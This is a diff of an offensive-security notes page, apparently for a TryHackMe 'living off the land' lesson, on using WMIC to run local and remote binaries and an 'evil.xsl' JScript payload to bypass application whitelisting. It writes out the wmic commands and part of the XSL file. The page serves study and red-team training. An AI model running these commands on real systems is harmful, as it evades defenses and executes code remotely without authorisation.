@@ -2,20 +2,20 @@
 
 ## Theory
 
-Windows Management Instrumentation (WMIC) is a Windows command-line utility that manages Windows components. People found that WMIC is also used to execute binaries for evading defensive measures. 
-We can try to execute binary or XSL file that contain jscript payload with WMIC.
+Windows Management Instrumentation (WMIC) is a Windows command-line utility that manages Windows components. People found that WMIC is also used to execute binaries for evading defensive measures. We can try to execute binary or XSL file that contain jscript payload with WMIC.
 
 ## Practice
 
 {% tabs %}
 {% tab title="Binary" %}
-
 Execute local binary (calc.exe)
+
 ```bash
 wmic.exe process call create calc
 ```
 
 Execute binary on remote system (evil.exe)
+
 ```bash
 wmic.exe /node:"192.168.0.1" process call create "evil.exe"
 ```
@@ -25,6 +25,7 @@ wmic.exe /node:"192.168.0.1" process call create "evil.exe"
 Another application whitelist bypassing technique discovered by Casey @subTee, similar to squiblydoo
 
 Define the XSL file containing the jscript payload:
+
 ```bash
 #evil.xsl
 <?xml version='1.0'?>
@@ -41,19 +42,21 @@ version="1.0">
 ```
 
 Invoke wmic command and specify /format pointing to the evil.xsl:
+
 ```bash
 wmic os get /FORMAT:"evil.xsl"
 ```
 
-
 Execute binary on remote system (evil.exe)
+
 ```bash
 wmic.exe /node:"192.168.0.1" process call create "evil.exe"
 ```
 {% endtab %}
 {% endtabs %}
 
-## References
+## Resources
 
 {% embed url="https://tryhackme.com/room/livingofftheland" %}
+
 {% embed url="https://www.ired.team/offensive-security/code-execution/application-whitelisting-bypass-with-wmic-and-xsl" %}
